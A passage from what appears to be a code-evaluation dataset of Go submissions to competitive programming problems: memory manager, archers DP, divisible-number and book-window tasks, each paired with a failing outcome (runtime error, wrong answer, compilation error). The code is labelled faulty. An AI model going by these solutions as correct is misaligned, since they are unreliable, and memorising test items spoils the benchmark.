toInt(scanner.Bytes())\n\t\tmp[pair{x,y}] = i\n\t\tpoints[0] = append(points[0], pair{x,y})\n\t\tpoints[1] = append(points[1], pair{y,x})\n\t}\n\tsort.Sort(pairs(points[0]))\n\tsort.Sort(pairs(points[1]))\n\tfor i:= range points[0] {\n\t\tif i > 0 {\n\t\t\tif points[0][i].first == points[0][i - 1].first {\n\t\t\t\tx := mp[points[0][i]]\n\t\t\t\ty := mp[points[0][i - 1]]\n\t\t\t\tg[x] = append(g[x], y)\n\t\t\t\tg[y] = append(g[y], x)\n\t\t\t\t\/\/fmt.Println(\">>\",x,y)\n\t\t\t}\n\t\t}\n\t}\n\n\tfor i:= range points[1] {\n\t\tif i > 0 {\n\t\t\tif points[1][i].first == points[1][i - 1].first {\n\t\t\t\tx := mp[pair{points[1][i].second, points[1][i].first}]\n\t\t\t\ty := mp[pair{points[1][i - 1].second, points[1][i - 1].first}]\n\t\t\t\tg[x] = append(g[x], y)\n\t\t\t\tg[y] = append(g[y], x)\n\t\t\t\t\/\/fmt.Println(\">>\",x,y)\n\t\t\t}\n\t\t}\n\t}\n\n\tvar ans int64\n\tans = 1\n\n\tfor i:= 1;i<= n;i++ {\n\t\tif !used[i] {\n\t\t\tcycle_found = false\n\t\t\tfor j:= range diff_x {\n\t\t\t\tused_x[diff_x[j]] = false\n\t\t\t}\n\t\t\tfor j:= range diff_y {\n\t\t\t\tused_y[diff_y[j]] = false\n\t\t\t}\n\t\t\tdiff_x = nil\n\t\t\tdiff_y = nil\n\t\t\tdfs(i,i)\n\t\t\tres := deg(len(diff_x) + len(diff_y))\n\t\t\t\/\/fmt.Println(res)\n\t\t\tif !cycle_found {\n\t\t\t\tres--\n\t\t\t}\n\t\t\tif res < 0 {\n\t\t\t\tres += MD\n\t\t\t}\n\t\t\tans = ans * res % MD\n\t\t}\n\t}\n\tfmt.Println(ans)\n}\n\n\n\n","description":"You are given n distinct points on a plane with integral coordinates. For each point you can either draw a vertical line through it, draw a horizontal line through it, or do nothing.You consider several coinciding straight lines as a single one. How many distinct pictures you can get? Print the answer modulo 109\u2009+\u20097.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009105)\u00a0\u2014 the number of points. n lines follow. The (i\u2009+\u20091)-th of these lines contains two integers xi, yi (\u2009-\u2009109\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u2009109)\u00a0\u2014 coordinates of the i-th point. It is guaranteed that all points are distinct.","output_spec":"Print the number of possible distinct pictures modulo 109\u2009+\u20097.","notes":"NoteIn the first example there are two vertical and two horizontal lines passing through the points. You can get pictures with any subset of these lines. For example, you can get the picture containing all four lines in two ways (each segment represents a line containing it). The first way:      The second way:      In the second example you can work with two points independently. The number of pictures is 32\u2009=\u20099.","sample_inputs":["4\n1 1\n1 2\n2 1\n2 2","2\n-1 -1\n0 1"],"sample_outputs":["16","9"]}
{"difficulty":1600,"lang":"Go","lang_cluster":"go","src_uid":"a6cba17c5ddb93f6741e00280fb6c54c","submission_id":"re_1555","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"bytes\"\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc main() {\n\treader := bufio.NewReader(os.Stdin)\n\n\tt, m := readTwoNums(reader)\n\n\tmanager := NewManager(m)\n\n\tvar buf bytes.Buffer\n\n\tfor t > 0 {\n\t\tt--\n\t\ts, _ := reader.ReadBytes('\\n')\n\n\t\tif s[0] == 'a' {\n\t\t\tvar n int\n\t\t\treadInt(s, len(\"alloc \"), &n)\n\t\t\tid := manager.Alloc(n)\n\n\t\t\tif id < 0 {\n\t\t\t\tbuf.WriteString(\"NULL\\n\")\n\t\t\t} else {\n\t\t\t\tbuf.WriteString(fmt.Sprintf(\"%d\\n\", id))\n\t\t\t}\n\t\t} else if s[0] == 'e' {\n\t\t\tvar x int\n\t\t\treadInt(s, len(\"erase \"), &x)\n\t\t\tok := manager.Erase(x)\n\t\t\tif !ok {\n\t\t\t\tbuf.WriteString(\"ILLEGAL_ERASE_ARGUMENT\\n\")\n\t\t\t}\n\t\t} else {\n\t\t\tmanager.Defragment()\n\t\t}\n\t}\n\n\tfmt.Print(buf.String())\n}\n\nfunc readInt(bytes []byte, from int, val *int) int {\n\ti := from\n\tsign := 1\n\tif bytes[i] == '-' {\n\t\tsign = -1\n\t\ti++\n\t}\n\ttmp := 0\n\tfor i < len(bytes) && bytes[i] >= '0' && bytes[i] <= '9' {\n\t\ttmp = tmp*10 + int(bytes[i]-'0')\n\t\ti++\n\t}\n\t*val = tmp * sign\n\treturn i\n}\n\nfunc readNum(reader *bufio.Reader) (a int) {\n\tbs, _ := reader.ReadBytes('\\n')\n\treadInt(bs, 0, &a)\n\treturn\n}\n\nfunc readTwoNums(reader *bufio.Reader) (a int, b int) {\n\tres := readNNums(reader, 2)\n\ta, b = res[0], res[1]\n\treturn\n}\n\nfunc readThreeNums(reader *bufio.Reader) (a int, b int, c int) {\n\tres := readNNums(reader, 3)\n\ta, b, c = res[0], res[1], res[2]\n\treturn\n}\n\nfunc readNNums(reader *bufio.Reader, n int) []int {\n\tres := make([]int, n)\n\tx := 0\n\tbs, _ := reader.ReadBytes('\\n')\n\tfor i := 0; i < n; i++ {\n\t\tfor x < len(bs) && (bs[x] < '0' || bs[x] > '9') {\n\t\t\tx++\n\t\t}\n\t\tx = readInt(bs, x, &res[i])\n\t}\n\treturn res\n}\n\nfunc readUint64(bytes []byte, from int, val *uint64) int {\n\ti := from\n\n\tvar tmp uint64\n\tfor i < len(bytes) && bytes[i] >= '0' && bytes[i] <= '9' {\n\t\ttmp = tmp*10 + uint64(bytes[i]-'0')\n\t\ti++\n\t}\n\t*val = tmp\n\n\treturn i\n}\n\ntype Node struct {\n\tnext *Node\n\tsz   int\n\tpos  int\n\tid   int\n}\n\nfunc NewNode(pos int, sz int) *Node {\n\tnode := new(Node)\n\tnode.pos = pos\n\tnode.sz = sz\n\treturn node\n}\n\ntype Manager struct {\n\tfree *Node\n\tused *Node\n\tmem  map[int]int\n\tp    int\n\ttot  int\n}\n\nfunc NewManager(m int) Manager {\n\tfree := new(Node)\n\tfree.next = NewNode(0, m)\n\tused := new(Node)\n\tmem := make(map[int]int)\n\treturn Manager{free, used, mem, 0, m}\n}\n\nfunc (this *Manager) Alloc(n int) int {\n\thead := this.free\n\n\tfor head.next != nil && head.next.sz < n {\n\t\thead = head.next\n\t}\n\n\tif head.next == nil {\n\t\treturn -1\n\t}\n\n\ttmp := head.next\n\tpos := tmp.pos\n\n\tvar tmp2 *Node\n\n\tif tmp.sz > n {\n\t\ttmp.sz -= n\n\t\ttmp.pos += n\n\t\ttmp2 = NewNode(pos, n)\n\t} else {\n\t\thead.next = tmp.next\n\t\ttmp2 = tmp\n\t}\n\n\thead = this.used\n\n\tfor head.next != nil && head.next.pos < pos {\n\t\thead = head.next\n\t}\n\n\ttmp2.next = head.next\n\n\thead.next = tmp2\n\n\tthis.p++\n\tthis.mem[this.p] = pos\n\ttmp2.id = this.p\n\n\treturn this.p\n}\n\nfunc (this *Manager) Erase(x int) bool {\n\tif pos, found := this.mem[x]; !found {\n\t\treturn false\n\t} else {\n\t\tdelete(this.mem, x)\n\t\thead := this.used\n\t\t\/\/remove it from used\n\t\tfor head.next != nil && head.next.pos < pos {\n\t\t\thead = head.next\n\t\t}\n\n\t\tif head.next == nil || head.next.pos > pos || head.next.id != x {\n\t\t\treturn false\n\t\t}\n\n\t\ttmp := head.next\n\t\thead.next = tmp.next\n\n\t\t\/\/ put back as free\n\t\thead = this.free\n\n\t\tfor head.next != nil && head.pos < pos {\n\t\t\thead = head.next\n\t\t}\n\n\t\tif head != this.free && head.pos+head.sz == pos {\n\t\t\thead.sz += tmp.sz\n\t\t\treturn true\n\t\t}\n\n\t\ttmp.id = -1\n\t\ttmp.next = head.next\n\t\thead.next = tmp\n\n\t\tif tmp.next != nil && tmp.pos+tmp.sz == tmp.next.pos {\n\t\t\ttmp.sz += tmp.next.sz\n\t\t\ttmp.next = tmp.next.next\n\t\t}\n\n\t\treturn true\n\t}\n}\n\nfunc (this *Manager) Defragment() {\n\thead := this.used\n\tvar sz int\n\n\tfor head.next != nil {\n\t\tcur := head.next\n\t\tcur.pos = sz\n\t\tsz += cur.sz\n\t\thead = head.next\n\t}\n\n\tif this.tot > sz {\n\t\tthis.free.next = NewNode(sz, this.tot-sz)\n\t} else {\n\t\tthis.free.next = nil\n\t}\n}\n","description":"There is little time left before the release of the first national operating system BerlOS. Some of its components are not finished yet \u2014 the memory manager is among them. According to the developers' plan, in the first release the memory manager will be very simple and rectilinear. It will support three operations:   alloc n \u2014 to allocate n bytes of the memory and return the allocated block's identifier x;  erase x \u2014 to erase the block with the identifier x;  defragment \u2014 to defragment the free memory, bringing all the blocks as close to the beginning of the memory as possible and preserving their respective order; The memory model in this case is very simple. It is a sequence of m bytes, numbered for convenience from the first to the m-th.The first operation alloc n takes as the only parameter the size of the memory block that is to be allocated. While processing this operation, a free block of n successive bytes is being allocated in the memory. If the amount of such blocks is more than one, the block closest to the beginning of the memory (i.e. to the first byte) is prefered. All these bytes are marked as not free, and the memory manager returns a 32-bit integer numerical token that is the identifier of this block. If it is impossible to allocate a free block of this size, the function returns NULL.The second operation erase x takes as its parameter the identifier of some block. This operation frees the system memory, marking the bytes of this block as free for further use. In the case when this identifier does not point to the previously allocated block, which has not been erased yet, the function returns ILLEGAL_ERASE_ARGUMENT.The last operation defragment does not have any arguments and simply brings the occupied memory sections closer to the beginning of the memory without changing their respective order.In the current implementation you are to use successive integers, starting with 1, as identifiers. Each successful alloc operation procession should return following number. Unsuccessful alloc operations do not affect numeration.You are to write the implementation of the memory manager. You should output the returned value for each alloc command. You should also output ILLEGAL_ERASE_ARGUMENT for all the failed erase commands.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two positive integers t and m (1\u2009\u2264\u2009t\u2009\u2264\u2009100;1\u2009\u2264\u2009m\u2009\u2264\u2009100), where t \u2014 the amount of operations given to the memory manager for processing, and m \u2014 the available memory size in bytes. Then there follow t lines where the operations themselves are given. The first operation is alloc n (1\u2009\u2264\u2009n\u2009\u2264\u2009100), where n is an integer. The second one is erase x, where x is an arbitrary 32-bit integer numerical token. The third operation is defragment. ","output_spec":"Output the sequence of lines. Each line should contain either the result of alloc operation procession , or ILLEGAL_ERASE_ARGUMENT as a result of failed erase operation procession. Output lines should go in the same order in which the operations are processed. Successful procession of alloc operation should return integers, starting with 1, as the identifiers of the allocated blocks.","notes":null,"sample_inputs":["6 10\nalloc 5\nalloc 3\nerase 1\nalloc 6\ndefragment\nalloc 6"],"sample_outputs":["1\n2\nNULL\n3"]}
{"difficulty":2600,"lang":"Go","lang_cluster":"go","src_uid":"a9bad412597726f8cdc0cfa2da891bc4","submission_id":"re_927","tags":["dp","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"bytes\"\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc main() {\n\treader := bufio.NewReader(os.Stdin)\n\n\tn, a, b := readThreeNums(reader)\n\n\th := readNNums(reader, n)\n\n\tres := solve(n, a, b, h)\n\n\tvar buf bytes.Buffer\n\n\tbuf.WriteString(fmt.Sprintf(\"%d\\n\", len(res)))\n\n\tfor i := 0; i < len(res); i++ {\n\t\tbuf.WriteString(fmt.Sprintf(\"%d \", res[i]))\n\t}\n\tfmt.Println(buf.String())\n}\n\nfunc readInt(bytes []byte, from int, val *int) int {\n\ti := from\n\tsign := 1\n\tif bytes[i] == '-' {\n\t\tsign = -1\n\t\ti++\n\t}\n\ttmp := 0\n\tfor i < len(bytes) && bytes[i] >= '0' && bytes[i] <= '9' {\n\t\ttmp = tmp*10 + int(bytes[i]-'0')\n\t\ti++\n\t}\n\t*val = tmp * sign\n\treturn i\n}\n\nfunc readNum(reader *bufio.Reader) (a int) {\n\tbs, _ := reader.ReadBytes('\\n')\n\treadInt(bs, 0, &a)\n\treturn\n}\n\nfunc readTwoNums(reader *bufio.Reader) (a int, b int) {\n\tres := readNNums(reader, 2)\n\ta, b = res[0], res[1]\n\treturn\n}\n\nfunc readThreeNums(reader *bufio.Reader) (a int, b int, c int) {\n\tres := readNNums(reader, 3)\n\ta, b, c = res[0], res[1], res[2]\n\treturn\n}\n\nfunc readNNums(reader *bufio.Reader, n int) []int {\n\tres := make([]int, n)\n\tx := 0\n\tbs, _ := reader.ReadBytes('\\n')\n\tfor i := 0; i < n; i++ {\n\t\tfor x < len(bs) && (bs[x] < '0' || bs[x] > '9') {\n\t\t\tx++\n\t\t}\n\t\tx = readInt(bs, x, &res[i])\n\t}\n\treturn res\n}\n\nfunc readUint64(bytes []byte, from int, val *uint64) int {\n\ti := from\n\n\tvar tmp uint64\n\tfor i < len(bytes) && bytes[i] >= '0' && bytes[i] <= '9' {\n\t\ttmp = tmp*10 + uint64(bytes[i]-'0')\n\t\ti++\n\t}\n\t*val = tmp\n\n\treturn i\n}\n\nconst H = 17\nconst INF = 10000\n\nfunc solve(n int, a int, b int, h []int) []int {\n\tfor i := 0; i < n; i++ {\n\t\th[i]++\n\t}\n\tif n == 3 {\n\t\tvar res []int\n\t\tfor h[0] > 0 || h[1] > 0 || h[2] > 0 {\n\t\t\th[0] = max(0, h[0]-b)\n\t\t\th[1] = max(0, h[1]-a)\n\t\t\th[2] = max(0, h[2]-b)\n\t\t\tres = append(res, 2)\n\t\t}\n\t\treturn res\n\t}\n\tdp := make([][][]int, n)\n\tfor i := 0; i < n; i++ {\n\t\tdp[i] = make([][]int, h[i]+1)\n\t\tfor j := 0; j <= h[i]; j++ {\n\t\t\tdp[i][j] = make([]int, 1+(H+a-1)\/a)\n\t\t\tfor k := 0; k < len(dp[i][j]); k++ {\n\t\t\t\tdp[i][j][k] = INF\n\t\t\t}\n\t\t}\n\t}\n\tdp[0][h[0]][0] = 0\n\n\tfor i := 1; i < n-1; i++ {\n\t\tfor j := 0; j <= h[i-1]; j++ {\n\t\t\tfor k := 0; k < len(dp[i-1][j]); k++ {\n\t\t\t\tif dp[i-1][j][k] >= INF {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\t\/\/first: need to make sure attacks at this archer can make h[i-1] to be zero\n\t\t\t\tfor kk := 0; kk < len(dp[i][j]); kk++ {\n\t\t\t\t\tjj := max(0, h[i]-b*k-a*kk)\n\t\t\t\t\tif kk*b >= j {\n\t\t\t\t\t\tdp[i][jj][kk] = min(dp[i][jj][kk], dp[i-1][j][k]+kk)\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tfor j := 0; j <= h[n-2]; j++ {\n\t\tfor k := 0; k < len(dp[n-2][j]); k++ {\n\t\t\tif dp[n-2][j][k] >= INF {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tif k*b >= h[n-1] {\n\t\t\t\tdp[n-1][0][0] = min(dp[n-1][0][0], dp[n-2][j][k])\n\t\t\t}\n\t\t}\n\t}\n\tbest := dp[n-1][0][0]\n\tres := make([]int, 0, best)\n\n\tfor i := n - 2; i > 0; i-- {\n\t\tvar found = false\n\t\tfor j := 0; j <= h[i] && !found; j++ {\n\t\t\tfor k := 0; k < len(dp[i][j]) && !found; k++ {\n\t\t\t\tif dp[i][j][k] == best {\n\t\t\t\t\tfor x := 0; x < k; x++ {\n\t\t\t\t\t\tres = append(res, i+1)\n\t\t\t\t\t}\n\t\t\t\t\tbest -= k\n\t\t\t\t\tfound = true\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn res\n}\n\nfunc max(a, b int) int {\n\tif a >= b {\n\t\treturn a\n\t}\n\treturn b\n}\n\nfunc min(a, b int) int {\n\tif a <= b {\n\t\treturn a\n\t}\n\treturn b\n}\n","description":"This is simplified version of the problem used on the original contest. The original problem seems to have too difiicult solution. The constraints for input data have been reduced.Polycarp likes to play computer role-playing game \u00abLizards and Basements\u00bb. At the moment he is playing it as a magician. At one of the last levels he has to fight the line of archers. The only spell with which he can damage them is a fire ball. If Polycarp hits the i-th archer with his fire ball (they are numbered from left to right), the archer loses a health points. At the same time the spell damages the archers adjacent to the i-th (if any) \u2014 they lose b (1\u2009\u2264\u2009b\u2009&lt;\u2009a\u2009\u2264\u200910) health points each.As the extreme archers (i.e. archers numbered 1 and n) are very far, the fire ball cannot reach them. Polycarp can hit any other archer with his fire ball.The amount of health points for each archer is known. An archer will be killed when this amount is less than 0. What is the minimum amount of spells Polycarp can use to kill all the enemies?Polycarp can throw his fire ball into an archer if the latter is already killed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains three integers n,\u2009a,\u2009b (3\u2009\u2264\u2009n\u2009\u2264\u200910; 1\u2009\u2264\u2009b\u2009&lt;\u2009a\u2009\u2264\u200910). The second line contains a sequence of n integers \u2014 h1,\u2009h2,\u2009...,\u2009hn (1\u2009\u2264\u2009hi\u2009\u2264\u200915), where hi is the amount of health points the i-th archer has.","output_spec":"In the first line print t \u2014 the required minimum amount of fire balls. In the second line print t numbers \u2014 indexes of the archers that Polycarp should hit to kill all the archers in t shots. All these numbers should be between 2 and n\u2009-\u20091. Separate numbers with spaces. If there are several solutions, output any of them. Print numbers in any order.","notes":null,"sample_inputs":["3 2 1\n2 2 2","4 3 1\n1 4 1 1"],"sample_outputs":["3\n2 2 2","4\n2 2 3 3"]}
{"difficulty":1600,"lang":"Go","lang_cluster":"go","src_uid":"b263917e47e1c84340bcb1c77999fd7e","submission_id":"re_1369","tags":["constructive algorithms","greedy","math","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"os\"\n\t\"bufio\"\n\t\"strconv\"\n\t\"fmt\"\n)\n\nfunc scanInt(scanner *bufio.Scanner) int {\n\tscanner.Scan()\n\tx, _ := strconv.Atoi(scanner.Text())\n\treturn x\n}\n\nfunc diminish(count []int, k int) bool {\n\tfor d := k; d < 10; d += 3 {\n\t\tif count[d] > 0 {\n\t\t\tcount[d] -= 1\n\t\t\treturn true\n\t\t}\n\t}\n\treturn false\n}\n\nfunc main() {\n\tscanner := bufio.NewScanner(os.Stdin)\n\tscanner.Split(bufio.ScanWords)\n\twriter := bufio.NewWriter(os.Stdout)\n\tdefer writer.Flush()\n\tn := scanInt(scanner)\n\tcount := make([]int, 10)\n\tsum := 0\n\tfor i := 0; i < n; i++ {\n\t\tx := scanInt(scanner)\n\t\tcount[x] += 1\n\t\tsum += x\n\t}\n\tif count[0] == 0 {\n\t\twriter.WriteString(\"-1\\n\")\n\t\treturn\n\t}\n\tif sum%3 == 1 {\n\t\tif !diminish(count, 1) {\n\t\t\tif !diminish(count, 2) || !diminish(count, 2) {\n\t\t\t\twriter.WriteString(\"-1\\n\")\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t} else if sum%3 == 2 {\n\t\tif !diminish(count, 2) {\n\t\t\tif !diminish(count, 1) || !diminish(count, 1) {\n\t\t\t\twriter.WriteString(\"-1\\n\")\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t}\n\tfor d := 9; d >= 0; d-- {\n\t\tfor i := 0; i < count[d]; i++ {\n\t\t\twriter.WriteString(fmt.Sprintf(\"%d\", d))\n\t\t}\n\t}\n\twriter.WriteString(\"\\n\")\n}\n","description":"Furik loves math lessons very much, so he doesn't attend them, unlike Rubik. But now Furik wants to get a good mark for math. For that Ms. Ivanova, his math teacher, gave him a new task. Furik solved the task immediately. Can you?You are given a set of digits, your task is to find the maximum integer that you can make from these digits. The made number must be divisible by 2, 3, 5 without a residue. It is permitted to use not all digits from the set, it is forbidden to use leading zeroes.Each digit is allowed to occur in the number the same number of times it occurs in the set.","input_from":"standard input","output_to":"standard output","input_spec":"A single line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100000) \u2014 the number of digits in the set. The second line contains n digits, the digits are separated by a single space. ","output_spec":"On a single line print the answer to the problem. If such number does not exist, then you should print -1.","notes":"NoteIn the first sample there is only one number you can make \u2014 0. In the second sample the sought number is 5554443330. In the third sample it is impossible to make the required number.","sample_inputs":["1\n0","11\n3 4 5 4 5 3 5 3 4 4 0","8\n3 2 5 1 5 2 2 3"],"sample_outputs":["0","5554443330","-1"]}
{"difficulty":1900,"lang":"Go","lang_cluster":"go","src_uid":"bc8b4b74c2f2d486e2d2f03982ef1013","submission_id":"re_1342","tags":["two pointers","dsu","data structures","binary search","trees"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"io\/ioutil\"\n\t\"os\"\n)\n\ntype Node struct {\n\tmax int\n\tmin int\n}\n\nvar n int\nvar h [100000]int\n\nfunc create(tree []*Node, l int, r int, index int) {\n\tif l == r {\n\t\ttree[index] = &Node{h[l], h[r]}\n\t\treturn\n\t}\n\tmid := (l + r) \/ 2\n\tcreate(tree, l, mid, index*2+1)\n\tcreate(tree, mid+1, r, index*2+2)\n\tmax, min := tree[index*2+1].max, tree[index*2+1].min\n\tif max < tree[index*2+2].max {\n\t\tmax = tree[index*2+2].max\n\t}\n\tif min > tree[index*2+2].min {\n\t\tmin = tree[index*2+2].min\n\t}\n\ttree[index] = &Node{max, min}\n}\n\nfunc query(tree []*Node, l int, r int, index int, lIndex int, rIndex int) (int, int) {\n\tif l == lIndex && r == rIndex {\n\t\treturn tree[index].max, tree[index].min\n\t}\n\tmid := (l + r) \/ 2\n\tif rIndex <= mid {\n\t\treturn query(tree, l, mid, index*2+1, lIndex, rIndex)\n\t}\n\tif lIndex >= mid+1 {\n\t\treturn query(tree, mid+1, r, index*2+2, lIndex, rIndex)\n\t}\n\tmax, min := query(tree, l, mid, index*2+1, lIndex, mid)\n\tmax1, min1 := query(tree, mid+1, r, index*2+2, mid+1, rIndex)\n\tif max < max1 {\n\t\tmax = max1\n\t}\n\tif min > min1 {\n\t\tmin = min1\n\t}\n\treturn max, min\n}\n\nfunc main() {\n\tbs, _ := ioutil.ReadAll(os.Stdin)\n\treader := bytes.NewBuffer(bs)\n\tvar n, k int\n\n\tfmt.Fscanf(reader, \"%d %d\\n\", &n, &k)\n\tfor i := 0; i < n; i++ {\n\t\tfmt.Fscanf(reader, \"%d \", &h[i])\n\t}\n\ttree := make([]*Node, 1000000)\n\tcreate(tree, 0, n-1, 0)\n\n\tlp, rp := 0, 0\n\tbest := 0\n\tvar solu []*Node\n\tfor rp != n {\n\t\tmax, min := query(tree, 0, n-1, 0, lp, rp)\n\t\tif max-min > k {\n\t\t\tlp++\n\t\t} else if best == rp-lp+1 {\n\t\t\tsolu = append(solu, &Node{rp, lp})\n\t\t\trp++\n\t\t} else if best < rp-lp+1 {\n\t\t\tbest = rp - lp + 1\n\t\t\tsolu = make([]*Node, 0, 100000)\n\t\t\tsolu = append(solu, &Node{rp, lp})\n\t\t\trp++\n\t\t} else {\n\t\t\trp++\n\t\t}\n\t}\n\n\twriter := bytes.NewBuffer(make([]byte, 0, 12000000))\n\tfmt.Fprintf(writer, \"%d %d\\n\", best, len(solu))\n\tfor i := 0; i < len(solu); i++ {\n\t\tfmt.Fprintf(writer, \"%d %d\\n\", solu[i].min+1, solu[i].max+1)\n\t}\n\twriter.WriteTo(os.Stdout)\n\n}\n","description":"There are several days left before the fiftieth birthday of a famous Berland's writer Berlbury. In this connection the local library decided to make an exposition of the works of this famous science-fiction writer. It was decided as well that it is necessary to include into the exposition only those books that were published during a particular time period. It is obvious that if the books differ much in size, the visitors will not like it. That was why the organizers came to the opinion, that the difference between the highest and the lowest books in the exposition should be not more than k millimeters.The library has n volumes of books by Berlbury, arranged in chronological order of their appearance. The height of each book in millimeters is know, it is hi. As Berlbury is highly respected in the city, the organizers want to include into the exposition as many books as possible, and to find out what periods of his creative work they will manage to cover. You are asked to help the organizers cope with this hard task.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two integer numbers separated by a space n (1\u2009\u2264\u2009n\u2009\u2264\u2009105) and k (0\u2009\u2264\u2009k\u2009\u2264\u2009106) \u2014 the amount of books by Berlbury in the library, and the maximum allowed height difference between the lowest and the highest books. The second line contains n integer numbers separated by a space. Each number hi (1\u2009\u2264\u2009hi\u2009\u2264\u2009106) is the height of the i-th book in millimeters.","output_spec":"In the first line of the output data print two numbers a and b (separate them by a space), where a is the maximum amount of books the organizers can include into the exposition, and b \u2014 the amount of the time periods, during which Berlbury published a books, and the height difference between the lowest and the highest among these books is not more than k milllimeters. In each of the following b lines print two integer numbers separated by a space \u2014 indexes of the first and the last volumes from each of the required time periods of Berlbury's creative work.","notes":null,"sample_inputs":["3 3\n14 12 10","2 0\n10 10","4 5\n8 19 10 13"],"sample_outputs":["2 2\n1 2\n2 3","2 1\n1 2","2 1\n3 4"]}
{"difficulty":2600,"lang":"Go","lang_cluster":"go","src_uid":"c23d3ec2b9fb4b4d169bc8053bfd000e","submission_id":"re_1467","tags":["dp","implementation","expression parsing"],"exec_outcome":"COMPILATION_ERROR","source_code":"package main\n\nimport (\n\t\"bytes\"\n\t\"errors\"\n\t\"fmt\"\n\t\"io\/ioutil\"\n\t\"os\"\n)\n\nvar macro2Op map[string]string\n\nfunc check(num0, num1, op string) error {\n\top0, ok0 := macro2Op[num0]\n\top1, ok1 := macro2Op[num1]\n\n\tif ok0 {\n\t\tif op0 == \"fail\" {\n\t\t\treturn errors.New(\"fail\")\n\t\t}\n\t\tif (op == \"*\" || op == \"\/\") && (op0 == \"+\" || op0 == \"-\") {\n\t\t\treturn errors.New(\"fail\")\n\t\t}\n\t}\n\n\tif ok1 {\n\t\tif op1 == \"fail\" {\n\t\t\treturn errors.New(\"fail\")\n\t\t}\n\t\tif (op == \"-\" && (op1 == \"-\" || op1 == \"+\")) || (op == \"\/\" && (op1 == \"\/\" || op1 == \"*\")) ||\n\t\t\t((op == \"*\" || op == \"\/\") && (op1 == \"+\" || op1 == \"-\")) {\n\t\t\treturn errors.New(\"fail\")\n\t\t}\n\t}\n\treturn nil\n}\n\nfunc getRank(tokens []string) string {\n\n\tif len(tokens) == 1 {\n\t\trank, ok := macro2Op[tokens[0]]\n\t\tif ok {\n\t\t\treturn rank\n\t\t} else {\n\t\t\treturn \"()\"\n\t\t}\n\t}\n\n\top := make([]string, 10000, 10000)\n\tnum := make([]string, 10000, 10000)\n\topPointer, numPointer := 0, 0\n\tret := \"\"\n\n\tfor i := 0; i < len(tokens); i++ {\n\t\tif tokens[i] == \"(\" {\n\t\t\top[opPointer] = \"(\"\n\t\t\topPointer++\n\t\t} else if tokens[i] == \"+\" || tokens[i] == \"-\" {\n\t\t\tfor opPointer != 0 {\n\t\t\t\tif op[opPointer-1] == \"*\" || op[opPointer-1] == \"\/\" || op[opPointer-1] == \"+\" || op[opPointer-1] == \"-\" {\n\t\t\t\t\terr := check(num[numPointer-2], num[numPointer-1], op[opPointer-1])\n\t\t\t\t\tif err != nil {\n\t\t\t\t\t\treturn \"fail\"\n\t\t\t\t\t}\n\t\t\t\t\tret = op[opPointer-1]\n\t\t\t\t\tnumPointer--\n\t\t\t\t\tnum[numPointer-1] = \"1\"\n\t\t\t\t\topPointer--\n\t\t\t\t} else {\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t\top[opPointer] = tokens[i]\n\t\t\topPointer++\n\t\t} else if tokens[i] == \"*\" || tokens[i] == \"\/\" {\n\t\t\tfor opPointer != 0 {\n\t\t\t\tif op[opPointer-1] == \"*\" || op[opPointer-1] == \"\/\" {\n\t\t\t\t\terr := check(num[numPointer-2], num[numPointer-1], op[opPointer-1])\n\t\t\t\t\tif err != nil {\n\t\t\t\t\t\treturn \"fail\"\n\t\t\t\t\t}\n\t\t\t\t\tret = op[opPointer-1]\n\t\t\t\t\tnumPointer--\n\t\t\t\t\tnum[numPointer-1] = \"1\"\n\t\t\t\t\topPointer--\n\t\t\t\t} else {\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t\top[opPointer] = tokens[i]\n\t\t\topPointer++\n\t\t} else if tokens[i] == \")\" {\n\t\t\tfor opPointer != 0 {\n\t\t\t\tif op[opPointer-1] == \"*\" || op[opPointer-1] == \"\/\" || op[opPointer-1] == \"+\" || op[opPointer-1] == \"-\" {\n\t\t\t\t\terr := check(num[numPointer-2], num[numPointer-1], op[opPointer-1])\n\t\t\t\t\tif err != nil {\n\t\t\t\t\t\treturn \"fail\"\n\t\t\t\t\t}\n\t\t\t\t\tnumPointer--\n\t\t\t\t\tnum[numPointer-1] = \"1\"\n\t\t\t\t\topPointer--\n\t\t\t\t} else if op[opPointer-1] == \"(\" {\n\t\t\t\t\topPointer--\n\t\t\t\t\tnum[numPointer-1] = \"1\"\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t\trank, ok := macro2Op[numPointer[numPointer-1]]\n\t\t\tif ok && rank == \"fail\" {\n\t\t\t\treturn rank\n\t\t\t}\n\t\t\tret = \"()\"\n\t\t} else {\n\t\t\tnum[numPointer] = tokens[i]\n\t\t\tnumPointer++\n\t\t}\n\t}\n\tfor opPointer != 0 {\n\t\terr := check(num[numPointer-2], num[numPointer-1], op[opPointer-1])\n\t\tif err != nil {\n\t\t\treturn \"fail\"\n\t\t}\n\t\tret = op[opPointer-1]\n\t\tnumPointer--\n\t\tnum[numPointer-1] = \"1\"\n\t\topPointer--\n\t}\n\n\treturn ret\n}\n\nfunc tokenize(s string) []string {\n\ttokens := make([]string, 0, 200)\n\tb := []byte(s)\n\ttoken := make([]byte, 0, 100)\n\tfor i := 0; i < len(b); i++ {\n\t\tif b[i] == '(' || b[i] == ')' ||\n\t\t\tb[i] == '+' || b[i] == '-' || b[i] == 